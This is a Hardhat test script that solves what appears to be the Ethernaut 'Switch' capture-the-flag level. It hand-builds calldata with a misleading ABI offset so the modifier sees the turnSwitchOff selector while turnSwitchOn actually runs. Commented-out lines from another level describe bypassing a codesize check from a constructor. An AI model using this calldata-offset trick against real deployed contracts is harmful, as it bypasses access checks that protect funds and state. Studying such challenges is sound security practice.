const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("Switch");
  const challengeAddress = await createChallenge(`0xb2aBa0e156C905a9FAEc24805a009d99193E3E53`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 29-Switch", async function () {
  const challenge = await getChallenge();
  const [eoa] = await ethers.getSigners();

  // https://docs.soliditylang.org/en/v0.8.21/abi-spec.html#examples
  // First 32 bytes = location of data, next 32 bytes = length of data, then data.

  const flipSelector = challenge.interface.encodeFunctionData("flipSwitch", ["0x"]).slice(2, 10);
  const onSelector = challenge.interface.encodeFunctionData("turnSwitchOn", []).slice(2, 10);
  const offSelector = challenge.interface.encodeFunctionData("turnSwitchOff", []).slice(2, 10);

  const payload = "0x" + flipSelector // Function selector for `flipSwitch`
    + ("0".repeat(62) + "60")         // Location of calldata
    + ("0".repeat(64))                // Dummy buffer to bypass `offSelector` check in modifier
    + offSelector + ("0".repeat(56))  // Function selector for `offSelector`
    + ("0".repeat(63) + "4")          // Length of calldata (4 bytes for function selector)
    + onSelector + ("0".repeat(56));  // Function selector for `onSelector`

  await eoa.sendTransaction({
    to: await challenge.getAddress(),
    data: payload,
  })

  // await challenge.turnSwitchOn();

  // const factory = await ethers.getContractFactory("GatekeeperThreeAttacker");

  // // Attacking within the constructor bypasses the `codesize == 0` check.
  // const contract = await factory.deploy(await challenge.getAddress(), {value: ethers.parseEther("0.002")});
  // await contract.waitForDeployment();

  // await contract.attack();

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
